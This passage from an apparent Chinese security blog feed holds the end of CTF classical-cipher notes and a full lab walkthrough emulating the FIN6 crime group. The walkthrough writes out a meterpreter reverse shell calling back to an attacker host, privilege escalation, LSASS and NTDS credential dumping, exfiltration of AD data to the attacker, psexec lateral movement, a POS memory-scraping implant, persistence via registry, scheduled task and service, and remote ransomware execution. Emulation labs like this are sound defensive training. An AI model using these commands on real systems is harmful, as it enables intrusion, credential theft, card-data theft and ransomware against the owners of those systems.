class="comment">#明文</span></span><br><span class="line"> </span><br><span class="line">text_list = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    text_list.append( ord(i) - <span class="number">97</span> )</span><br><span class="line"></span><br><span class="line">aa = gmpy2.invert(a, <span class="number">26</span>) <span class="comment">#求解模逆元</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text_list:</span><br><span class="line">    tmp = (aa * (i - b)) % <span class="number">26</span></span><br><span class="line">    flag += chr(tmp + <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ul><li><strong>暴力破解</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"..."</span></span><br><span class="line"> </span><br><span class="line">text_list = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    text_list.append( ord(i) - <span class="number">97</span> )</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text_list:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        c = (<span class="number">17</span> * j - <span class="number">8</span>) % <span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span>(c == i):</span><br><span class="line">            flag += chr(j + <span class="number">97</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="01-原理-13"><a href="#01-原理-13" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　</p><h3 id="02-解题-7"><a href="#02-解题-7" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href>通道1</a></li><li><a href>通道2</a></li></ul><hr><h1 id="03-换位加密"><a href="#03-换位加密" class="headerlink" title="03 换位加密"></a>03 换位加密</h1><h2 id="0x01-栅栏密码-Rail-fence-Cipher"><a href="#0x01-栅栏密码-Rail-fence-Cipher" class="headerlink" title="0x01 栅栏密码(Rail-fence Cipher)"></a>0x01 栅栏密码(Rail-fence Cipher)</h2><h3 id="01-原理-14"><a href="#01-原理-14" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。</p><h3 id="02-样例-1"><a href="#02-样例-1" class="headerlink" title="02 样例"></a>02 样例</h3><ul><li>c = KYsd3js2E{a2jda}<ul><li>KYsd3js2</li><li>E{a2jda}</li></ul></li><li>m = <code>KEY{sad23jjdsa2}</code></li></ul><h3 id="03-解题-5"><a href="#03-解题-5" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li>CTFcrackTools工具(所有结果罗列)</li><li><a href="http://ctf.ssleye.com/railfence.html" target="_blank" rel="noopener">通道2(不区分大小写)</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">通道3(区分大小写)</a></li></ul><hr><h2 id="0x02-转盘加密"><a href="#0x02-转盘加密" class="headerlink" title="0x02 转盘加密"></a>0x02 转盘加密</h2><h3 id="01-原理-15"><a href="#01-原理-15" class="headerlink" title="01 原理"></a>01 原理</h3><p><strong>题目</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;</span><br><span class="line">10：&lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;</span><br><span class="line">11：&lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;</span><br><span class="line">12：&lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;</span><br><span class="line">13：&lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;</span><br><span class="line">14：&lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;</span><br><span class="line"></span><br><span class="line">密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12</span><br><span class="line">密文：HCBTSXWCRQGLES</span><br><span class="line">flag格式 flag&#123;你解密的内容&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><p>这个转盘加密，比如第一个密钥匙：2、密文匙：H</p><p>把转盘第二行单独提出来  2： &lt;KPBELNACZDTRXMJQOY<strong>HGVSFUWI</strong> &lt; ；从H的地方一直剪切，把剪切的内容放在最前面，变成   2： &lt;<strong>HGVSFUWI</strong>KPBELNACZDTRXMJQOY &lt;</p><p>依次类推把14行都按这样的方式整一遍就得到这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2：  &lt;HGVSFUWIKPBELNACZDTRXMJQOY &lt;</span><br><span class="line">5：  &lt;CPMNZQWXYIHFRLABEUOTSGJVDK &lt;</span><br><span class="line">1：  &lt;BVIQHKYPNTCRMOSFEZWAXJGDLU &lt;</span><br><span class="line">3：  &lt;TEQGYXPLOCKBDMAIZVRNSJUWFH &lt;</span><br><span class="line">6：  &lt;SLOQXVETAMKGHIWPNYCJBFZDRU &lt;</span><br><span class="line">4：  &lt;XQYIZMJWAORPLNDVHGFCUKTEBS &lt;</span><br><span class="line">9：  &lt;WATDSRFHENYVUBMCOIKZGJXPLQ &lt;</span><br><span class="line">7：  &lt;CEONJQGWTHSPYBXIZULVKMRAFD &lt;</span><br><span class="line">8：  &lt;RJLXKISEFAPMYGHBQNOZUTWDCV &lt;</span><br><span class="line">14：&lt;QWXPHKZGJTDSENYVUBMLAOIRFC &lt;</span><br><span class="line">10：&lt;GOIKFHENYVUWABMCXPLTDSRJQZ &lt;</span><br><span class="line">13：&lt;LTDENQWAOXPYVUIKZGJBMCSRFH &lt;</span><br><span class="line">11：&lt;ENYSRUBMCQWVJXPLTDAOIKFZGH &lt;</span><br><span class="line">12：&lt;SWAYXPLVUBOIKZGJRFHENMCQTD &lt;</span><br></pre></td></tr></table></figure><p>flag在倒数第六列。</p><p>flag{XSXSBUGKUADMIN}，可能要转化为小写。</p><hr><h1 id="04-文件加密"><a href="#04-文件加密" class="headerlink" title="04 文件加密"></a>04 文件加密</h1><h2 id="0x01-zip压缩包破解"><a href="#0x01-zip压缩包破解" class="headerlink" title="0x01 zip压缩包破解"></a>0x01 zip压缩包破解</h2><p><a href>我跳</a></p><h2 id="0x02-Linux-shadow-文件破解密码"><a href="#0x02-Linux-shadow-文件破解密码" class="headerlink" title="0x02 Linux shadow 文件破解密码"></a>0x02 Linux shadow 文件破解密码</h2><p>john爆破：<code>john filename</code></p><h1 id="05-其他加密"><a href="#05-其他加密" class="headerlink" title="05 其他加密"></a>05 其他加密</h1><h2 id="01-键盘布局加密"><a href="#01-键盘布局加密" class="headerlink" title="01 键盘布局加密"></a>01 键盘布局加密</h2><p>密文：<code>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</code></p><p>明文：<code>TONGYUAN</code></p><h1 id="0x-参考"><a href="#0x-参考" class="headerlink" title="0x 参考"></a>0x 参考</h1><ul><li><a href="http://blog.neargle.com/SecNewsBak/drops/CTF中那些脑洞大开的编码和加密 .html" target="_blank" rel="noopener">CTF中那些脑洞大开的编码和加密</a></li><li>具体请看：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/classical/introduction-zh/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fin6模拟流程</title>
      <link href="/2020/07/13/Fin6%E6%A8%A1%E6%8B%9F%E6%B5%81%E7%A8%8B/"/>
      <url>/2020/07/13/Fin6%E6%A8%A1%E6%8B%9F%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　FIN6被认为是一个以金融为动机的网络犯罪集团。至少自2015年以来，该集团一直在瞄准酒店和零售行业的大量POS系统，并对其进行破坏。攻击生命周期：初步入侵，建立立足点；提升特权；内部侦察与横向运动等。</p><p>　　此文按照github <a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6" target="_blank" rel="noopener">参考</a>模拟。</p><h1 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h1><ul><li>攻击主机：<ul><li>kali：192.168.0.133</li></ul></li><li>目标主机：<ul><li>win server 2019（win1）：192.168.0.134<ul><li>域：DRAGON</li><li>Administrator：DRAGON\Administrator</li><li>User：DRAGON\pig</li></ul></li><li>win server 2019 2(win2)：192.168.0.135 <ul><li>域：DRAGON</li></ul></li><li>win server 2012(win3)：192.168.0.136<ul><li>域：PHOENIX</li></ul></li><li>win10-1903(win4)：192.168.0.131<ul><li>域：PHOENIX</li><li>User：PHOENIX\User1</li></ul></li></ul></li></ul><h1 id="MSF操作"><a href="#MSF操作" class="headerlink" title="MSF操作"></a>MSF操作</h1><ul><li>开启msf：msfconsole</li><li>查看配置：options</li><li>查看所有的MSF连接：sessions</li><li>关闭所有的MSF链接：sessions -K</li><li>关闭某个MSF链接：sessions -k id</li><li>从cmd退回meterpreter：exit或crtl+c</li><li>从meterpreter退回至msf(不切断连接)：background</li><li>从meterpreter退回至msf(切断连接)：exit</li><li></li></ul><hr><ul><li>win关机：win+R  输入：shutdown -s -t 0</li><li>win重启：win+R  输入：shutdown -r -t 0</li></ul><h1 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h1><h2 id="Step-1-FIN6-Initial-Access（获取目标机访问权）"><a href="#Step-1-FIN6-Initial-Access（获取目标机访问权）" class="headerlink" title="Step 1 FIN6 Initial Access（获取目标机访问权）"></a>Step 1 FIN6 Initial Access（获取目标机访问权）</h2><ol><li><p>kali 构建反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 5 LHOST=192.168.0.133 LPORT=12315 -f exe &gt; ~/http.exe</span><br></pre></td></tr></table></figure><ul><li>LHOST：对应kali ip</li><li>LPORT：对应kali 端口</li></ul></li><li><p>win1 点击运行 http.exe</p></li><li><p>kali 进入metasploit：msfconsole；并配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler #进入</span><br><span class="line">set payload windows/meterpreter/reverse_http #选择此攻击载荷</span><br><span class="line">set LHOST 192.168.0.133 #设置ip</span><br><span class="line">set LPORT 12315 #设置端口</span><br><span class="line">show options  #查看此攻击载荷的配置</span><br><span class="line">exploit</span><br><span class="line">shell #跳转至win1 cmd</span><br><span class="line">cd C:\Windows\Temp #切换目录</span><br></pre></td></tr></table></figure></li></ol><h2 id="Step2-FIN6-Discovery（内部侦察与横向运动，发现网络和AD环境）"><a href="#Step2-FIN6-Discovery（内部侦察与横向运动，发现网络和AD环境）" class="headerlink" title="Step2 FIN6 Discovery（内部侦察与横向运动，发现网络和AD环境）"></a>Step2 FIN6 Discovery（内部侦察与横向运动，发现网络和AD环境）</h2><ol><li><p>将Adfind.exe 上传至 win1 C:\Windows\Temp</p></li><li><p>下面均在win 1 中执行：（Adfind.exe无法使用可以使用Windows自带的备用指令，<strong>但是win1反弹shell执行均不成功，win3备用指令部分成功</strong>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 2.1 Account Discovery: Domain Account</span><br><span class="line">adfind.exe -f (objectcategory=person) &gt; ad_users.txt</span><br><span class="line"><span class="meta">#</span>备用指令</span><br><span class="line">net user /domain &gt; ad_users.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 2.2 Remote System Discovery</span><br><span class="line">adfind.exe -f (objectcategory=computer) &gt; ad_computers.txt</span><br><span class="line"><span class="meta">#</span>备用指令</span><br><span class="line">net group "Domain Computers" /domain &gt; ad_computers.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 2.3 Domain Trust Discovery</span><br><span class="line">adfind.exe -f (objectcategory=organizationalUnit) &gt; ad_ous.txt</span><br><span class="line"><span class="meta">#</span>备用指令（win3也不可以）</span><br><span class="line">Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 2.4 Domain Trust Discovery </span><br><span class="line">adfind.exe -gcb -sc trustdmp &gt; ad_trustdmp.txt</span><br><span class="line"><span class="meta">#</span>备用指令</span><br><span class="line">nltest /domain_trusts &gt; ad_trustdmp.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 2.5 System Network Configuration Discovery</span><br><span class="line">adfind.exe -subnets -f (objectcategory=subnet) &gt; ad_subnets.txt</span><br><span class="line"><span class="meta">#</span>备用指令（win3也不可以）</span><br><span class="line">Get-ADReplicationSubnet -Filter *</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 2.6 Permission Groups Discovery: Domain Groups</span><br><span class="line">adfind.exe -f (objectcategory=group) &gt; ad_group.txt</span><br><span class="line"><span class="meta">#</span>备用指令</span><br><span class="line">net group /domain &gt; ad_group.txt</span><br></pre></td></tr></table></figure></li></ol><h2 id="Step-3-FIN6-Privilege-Escalation（提升权限）"><a href="#Step-3-FIN6-Privilege-Escalation（提升权限）" class="headerlink" title="Step 3 FIN6 Privilege Escalation（提升权限）"></a>Step 3 FIN6 Privilege Escalation（提升权限）</h2><ol><li><p>Access Token Manipulation（pig User登录win1， 提权到system权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>查看当前权限：Server username: PHOENIX\pig</span><br><span class="line"><span class="meta">meterpreter&gt;</span> getuid</span><br><span class="line"><span class="meta">#</span>提升权限</span><br><span class="line"><span class="meta">meterpreter&gt;</span> getsystem -t 1</span><br><span class="line"><span class="meta">#</span>查看权限等级：Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="meta">meterpreter&gt;</span> getuid</span><br></pre></td></tr></table></figure></li><li><p>OS Credential Dumping: LSASS Memory（操作系统凭据转储：列举所有凭据，读取Windows明文密码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">meterpreter&gt;</span> load kiwi</span><br><span class="line"><span class="meta">meterpreter&gt;</span> creds_all #列举所有凭据，读取Windows明文密码</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>注意：kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。需要进行进程迁移</span><br><span class="line"><span class="meta">#</span>http://cn-sec.com/archives/143645.html</span><br><span class="line"><span class="meta">meterpreter&gt;</span> sysinfo #查看系统信息</span><br><span class="line"><span class="meta">meterpreter&gt;</span> ps  #选定一个进程的PID，此处选择的是lsass.exe</span><br><span class="line"><span class="meta">meterpreter&gt;</span> migrate &#123;PID&#125; #进程迁移</span><br><span class="line"><span class="meta">meterpreter&gt;</span> load kiwi</span><br><span class="line"><span class="meta">meterpreter&gt;</span> creds_all #列举所有凭据，读取Windows明文密码</span><br></pre></td></tr></table></figure></li><li><p>OS Credential Dumping: NTDS （<strong>使用ntdsutil命令代替，但是在反弹shell中未成功</strong>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">msf&gt;</span> use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">msf exploit(psexec) &gt; set Target PowerShell</span><br><span class="line">msf exploit(psexec) &gt; set RHost 192.168.0.136 #&#123;POS system&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBDomain PHEONIX #&#123;Domain&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBPass 1+1=2@lzl#&#123;Password&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBUser Administrator #&#123;User&#125;</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>上述方法失败，使用ntdsutil命令代替</span><br><span class="line"><span class="meta">#</span>解决The RPC Server is too Busy to Complete this Operation Error</span><br><span class="line">https://www.techinpost.com/the-rpc-server-is-too-busy-to-complete-this-operation/</span><br><span class="line">在win cmd中执行：https://www.freebuf.com/articles/system/177764.html16637</span><br><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></li></ol><h2 id="Step-4-FIN6-Collection-and-Exfiltration（收集结果文件）"><a href="#Step-4-FIN6-Collection-and-Exfiltration（收集结果文件）" class="headerlink" title="Step 4 - FIN6 Collection and Exfiltration（收集结果文件）"></a>Step 4 - FIN6 Collection and Exfiltration（收集结果文件）</h2><ol><li><p>Archive Collected Data: Archive via Utility（在反弹shell中执行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 在win1 安装7z，将exe文件复制到C:\Windows\Temp，重命名为7.exe</span><br><span class="line">7.exe a -mx3 ad.7z ad_*</span><br></pre></td></tr></table></figure></li><li><p>Exfiltration Over Web Service: Exfiltration to Cloud Storage（在反弹shell中执行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 将pscp.exe复制到C:\Windows\Temp</span><br><span class="line">pscp -P 22 ad.7z kali@192.168.0.133:/home/kali/fin6</span><br></pre></td></tr></table></figure></li></ol><h1 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h1><h2 id="Step-5-Scenario-1-Attacking-Point-of-Sale-POS-Systems"><a href="#Step-5-Scenario-1-Attacking-Point-of-Sale-POS-Systems" class="headerlink" title="Step 5 Scenario 1 - Attacking Point of Sale (POS) Systems"></a>Step 5 Scenario 1 - Attacking Point of Sale (POS) Systems</h2><ol><li><p>Lateral movement to POS system using a Command and Control (C2) Framework.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">msf&gt;</span> use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set Target PowerShell</span><br><span class="line">msf exploit(psexec) &gt; set RHost 192.168.0.136 #&#123;POS system&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBDomain PHEONIX #&#123;Domain&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBPass 1+1=2@lzl#&#123;Password&#125;</span><br><span class="line">msf exploit(psexec) &gt; set SMBUser Administrator #&#123;User&#125;</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br></pre></td></tr></table></figure></li><li><p>Deploy POS implant to harvest POS data</p><blockquote><p>使用<a href="https://github.com/MScholtes/Win-PS2EXE" target="_blank" rel="noopener">Win-PS2EXE</a>编译内存刮取脚本<a href="https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1" target="_blank" rel="noopener">mem_scraper</a>，编译成可执行文件 Assistant32.exe</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 上传exe文件</span><br><span class="line"><span class="meta">meterpreter&gt;</span> upload /home/kali/fin6/Assistant32.exe C:\\Windows\\temp</span><br></pre></td></tr></table></figure></li><li><p>Executing the POS implant using WMIC </p><blockquote><p>使用WMIC执行POS植入</p><p>C:\&gt; wmic /node:”192.168.0.136” process call create “c:\windows\temp\Assistant32.exe -Proc iexplore”</p></blockquote></li><li><p>Persistence </p><blockquote><p>运行注册表键</p><p>“C:\Windows\System32\reg.exe” ADD “HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “Windows Help Assistant” /t REG_SZ /d “rundll32.exe “C:\Windows\SysWOW64\0409\Assistant.dll”,workerInstance” /f</p><p>Scheduled Task</p><p>“C:\Windows\System32\schtasks.exe” /create /tn WindowsHelpAssistant /tr “rundll32.exe “C:\Windows\SysWOW64\0409\Assistant32.dll”,workerInstance” /sc onstart /ru System</p><p>Service Creation</p><p>sc create “Windows Help Assistant” binpath=”c:\windows\temp\Assistant32.exe” start=”auto” obj=”LocalSystem”</p></blockquote></li></ol><h2 id="Step-6-Scenario-2-Attacking-E-Commerce-Platforms"><a href="#Step-6-Scenario-2-Attacking-E-Commerce-Platforms" class="headerlink" title="Step 6 Scenario 2 - Attacking E-Commerce Platforms"></a>Step 6 Scenario 2 - Attacking E-Commerce Platforms</h2><p>与 Step 5 类似</p><h2 id="Step7-Scenario-3-Deploying-Ransomware"><a href="#Step7-Scenario-3-Deploying-Ransomware" class="headerlink" title="Step7 Scenario 3 - Deploying Ransomware"></a>Step7 Scenario 3 - Deploying Ransomware</h2><ol><li><p>上传 script 至域中其他主机（win4）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建脚本（内容在文档上）</span><br><span class="line">上传脚本</span><br><span class="line"><span class="meta">meterpreter&gt;</span> cd C:\\Windows\\Temp</span><br><span class="line"><span class="meta">meterpreter&gt;</span> upload /home/kali/fin6/sss.exe c:\\windows\\temp</span><br><span class="line"><span class="meta">meterpreter&gt;</span> upload /home/kali/fin6/xaa.bat c:\\windows\\temp</span><br><span class="line"><span class="meta">meterpreter&gt;</span> upload /home/kali/fin6/kill.bat c:\\windows\\temp</span><br><span class="line"></span><br><span class="line">copy命令</span><br><span class="line">C:\Windows\Temp&gt; for %I in (sss.exe xaa.bat kill.bat) do copy %I \\192.168.0.131\\c$\\windows\\temp</span><br></pre></td></tr></table></figure></li><li><p>Distribute the ransomware and kill script to the intended targets. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.134 /user:"DRAGON\Administrator" /password:"1+1=2@lzl" process call create "cmd.exe /c copy \\192.168.0.131\\c$\\windows\\temp\\sss.exe c:\\windows\\temp"</span><br><span class="line"></span><br><span class="line">wmic /node:192.168.0.134 /user:"DRAGON\Administrator" /password:"1+1=2@lzl" process call create "cmd.exe /c copy \\192.168.0.131\\c$\\windows\\temp\\kill.bat c:\\windows\\temp"</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>Execute the kill script and then the ransomware.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.134 /user:"DRAGON\Administrator" /password:"1+1=2@lzl" process call create "cmd /c c:\\windows\\temp\\kill.bat"</span><br><span class="line"></span><br><span class="line">wmic /node:192.168.0.134 /user:"DRAGON\Administrator" /password:"1+1=2@lzl" process call create "cmd /c c:\\windows\\temp\\sss.exe"</span><br><span class="line"></span><br><span class="line">psexec.exe \\192.168.0.134 -u "DRAGON\Administrator" -p "1+1=2@lzl" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\kill.bat</span><br><span class="line">   </span><br><span class="line">psexec.exe \\192.168.0.134 -u "DRAGON\Administrator" -p "1+1=2@lzl" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe</span><br></pre></td></tr></table></figure></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.secrss.com/articles/9729" target="_blank" rel="noopener">【安全参数】APT组织FIN6入侵工程行业，欲投放流行勒索软件</a></li><li><p><a href="https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html" target="_blank" rel="noopener">Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware</a></p></li><li><p><a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md" target="_blank" rel="noopener">操作文档</a></p></li><li><a href="https://www.youtube.com/watch?v=n5jeGSOyJzY" target="_blank" rel="noopener">演示视频</a></li><li><a href="https://www.bilibili.com/video/BV1Yt4y1C7pe?from=search&amp;seid=4970630219225802194" target="_blank" rel="noopener">计网实验-AD域搭建（Windows Server2012）</a></li><li><a href="https://www.bilibili.com/video/BV19k4y1B7yH?from=search&amp;seid=5046780361350275342" target="_blank" rel="noopener">Windows server 2019 AD域控制器搭建</a></li><li><p><a href="https://blog.51cto.com/superwolf/2108600" target="_blank" rel="noopener">Metasploit 生成反弹shell</a></p></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA题型整理</title>
      <link href="/2020/07/07/RSA%E9%A2%98%E5%9E%8B%E6%95%B4%E7%90%86/"/>
      <url>/2020/07/07/RSA%E9%A2%98%E5%9E%8B%E6%95%B4%E7%90%86/</url>
      
